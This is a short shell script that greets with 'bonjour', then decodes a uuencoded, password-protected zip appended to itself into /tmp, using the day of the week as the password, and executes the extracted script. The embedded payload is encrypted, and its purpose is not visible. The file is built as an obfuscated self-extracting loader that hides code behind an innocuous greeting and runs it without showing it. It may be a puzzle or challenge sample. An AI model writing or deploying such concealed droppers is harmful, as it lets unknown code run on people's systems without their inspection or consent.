echo 'bonjour'
tail -n 10 $0 | uudecode -o /tmp/plop.z
unzip -P `date +%u` -p /tmp/plop.z | cat > /tmp/plop.sh
if test `head -n 1 /tmp/plop.sh |grep -c 'for'` -eq 1; then
	tail -n 18 $0 | head -n 8 > /tmp/ssr.txt
	chmod 700 /tmp/plop.sh 
	/tmp/plop.sh
fi
exit
begin 664 plop
M4$L#!"T`"0`(`*=,1$L``*=,__________\!`!0`+0$`$```````````````
M````````]9&'9G#)@4_G=+1O7*.+I`S9]J3BOW`.RC5]YVRQ1(0*^A:PP,9A
M51`\`D&L&:'!&##/4Y-\9S;6,+T<`I[`K45&<!#6H<N#][3T!0OS<.[1+V%Z
M&/EN)*)].^3A+[XM-D.+G\M;8T-35.LMIZ4TX8@4U)R1I=2B6O:MI:UQUGAE
M)4]@]=-,V1.&4$L'".1#?-^*`````````*(`````````4$L!`AX#+0`)``@`
MITQ$2^1#?-^*````H@````$``````````0```(`1`````"U02P4&``````$`
,`0`O````U0``````
`
end
